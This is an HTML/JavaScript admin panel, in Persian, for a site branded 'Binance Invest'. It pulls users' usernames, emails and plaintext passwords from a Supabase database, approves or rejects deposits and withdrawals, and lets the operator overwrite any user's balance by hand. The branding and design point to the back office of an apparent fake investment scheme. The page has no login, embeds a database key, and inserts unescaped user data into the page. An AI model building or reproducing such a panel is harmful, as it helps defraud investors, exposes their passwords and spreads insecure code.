<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پنل مدیریت ادمین - Binance Invest</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { box-sizing: border-box; font-family: Tahoma, sans-serif; }
        body { background-color: #121318; color: #fff; margin: 0; padding: 15px; }
        .container { max-width: 100%; margin: 0 auto; }
        h1, h2 { color: #f0b90b; font-size: 18px; }
        .card { background: #1e2329; border-radius: 8px; padding: 12px; margin-bottom: 15px; border: 1px solid #2b313a; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; overflow-x: auto; display: block; }
        th, td { padding: 8px; text-align: right; border-bottom: 1px solid #2b313a; font-size: 12px; }
        th { color: #848e9c; }
        .btn { padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 4px; }
        .btn-approve { background: #0ecb81; color: #fff; }
        .btn-reject { background: #f6465d; color: #fff; }
        .btn-update { background: #f0b90b; color: #000; }
        input { background: #2b313a; border: 1px solid #474d57; color: #fff; padding: 5px; border-radius: 4px; width: 80px; }
    </style>
</head>
<body>

<div class="container">
    <h1>🛡️ پنل مدیریت Binance Invest</h1>
    
    <div class="card">
        <h2>📥 درخواست‌های واریز و برداشت</h2>
        <table>
            <thead>
                <tr>
                    <th>کاربر</th>
                    <th>نوع</th>
                    <th>مبلغ</th>
                    <th>عملیات</th>
                </tr>
            </thead>
            <tbody id="tx-list">
                <tr><td colspan="4">در حال دریافت...</td></tr>
            </tbody>
        </table>
    </div>

    <div class="card">
        <h2>👥 مدیریت کاربران (اطلاعات و موجودی)</h2>
        <table>
            <thead>
                <tr>
                    <th>نام کاربری</th>
                    <th>ایمیل</th>
                    <th>رمز عبور</th>
                    <th>موجودی ($)</th>
                    <th>عملیات</th>
                </tr>
            </thead>
            <tbody id="user-list">
                <tr><td colspan="5">در حال دریافت...</td></tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    const SUPABASE_URL = "https://zpwxvngrowhqquwpovuf.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inpwd3h2bmdyb3docXF1d3BvdnVmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY3MjU3OTgsImV4cCI6MjEwMjMwMTc5OH0.Mri2kecKEUZTN3z_IqxR8_J8FYDeTj3SJtBfQcq_6X8"; 
    
    const db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    async function loadTransactions() {
        const { data, error } = await db.from('transactions').select('*');
        const list = document.getElementById('tx-list');
        list.innerHTML = '';

        if (error || !data) {
            list.innerHTML = '<tr><td colspan="4">خطا در دریافت اطلاعات.</td></tr>';
            return;
        }

        const pendingTxs = data.filter(tx => tx.status && tx.status.toLowerCase() === 'pending');

        if (pendingTxs.length === 0) {
            list.innerHTML = '<tr><td colspan="4">هیچ درخواستی نیست.</td></tr>';
            return;
        }

        pendingTxs.forEach(tx => {
            const uname = tx.username || 'کاربر';
            const typeText = tx.type === 'deposit' ? '🟢 واریز' : '🔴 برداشت';
            list.innerHTML += `
                <tr>
                    <td>${uname}</td>
                    <td>${typeText}</td>
                    <td>$${tx.amount}</td>
                    <td>
                        <button class="btn btn-approve" onclick="approveTx('${tx.id}', '${uname}', ${tx.amount}, '${tx.type}')">تایید</button>
                        <button class="btn btn-reject" onclick="rejectTx('${tx.id}')">رد</button>
                    </td>
                </tr>
            `;
        });
    }

    async function loadUsers() {
        const { data, error } = await db.from('users').select('*');
        const list = document.getElementById('user-list');
        list.innerHTML = '';

        if (error || !data || data.length === 0) {
            list.innerHTML = '<tr><td colspan="5">کاربری یافت نشد.</td></tr>';
            return;
        }

        data.forEach(u => {
            list.innerHTML += `
                <tr>
                    <td>${u.username || 'بدون نام'}</td>
                    <td>${u.email || 'ثبت نشده'}</td>
                    <td>${u.password || 'ثبت نشده'}</td>
                    <td>$${u.balance || 0}</td>
                    <td>
                        <input type="number" id="bal-${u.id}" value="${u.balance || 0}">
                        <button class="btn btn-update" onclick="updateBalance('${u.id}')">ثبت</button>
                    </td>
                </tr>
            `;
        });
    }

    async function approveTx(txId, username, amount, type) {
        if (!confirm('تایید شود؟')) return;
        await db.from('transactions').update({ status: 'Approved' }).eq('id', txId);

        const { data: user } = await db.from('users').select('balance').eq('username', username).single();
        let currentBalance = user ? Number(user.balance) : 0;
        
        if (type === 'deposit') currentBalance += Number(amount);
        else if (type === 'withdraw' || type === 'withdrawal') currentBalance -= Number(amount);

        await db.from('users').update({ balance: currentBalance }).eq('username', username);
        alert('انجام شد.');
        refreshAll();
    }

    async function rejectTx(txId) {
        if (!confirm('رد شود؟')) return;
        await db.from('transactions').update({ status: 'Rejected' }).eq('id', txId);
        alert('رد شد.');
        refreshAll();
    }

    async function updateBalance(userId) {
        const newBal = document.getElementById(`bal-${userId}`).value;
        await db.from('users').update({ balance: newBal }).eq('id', userId);
        alert('بروز شد.');
        refreshAll();
    }

    function refreshAll() {
        loadTransactions();
        loadUsers();
    }

    refreshAll();
</script>

</body>
</html>
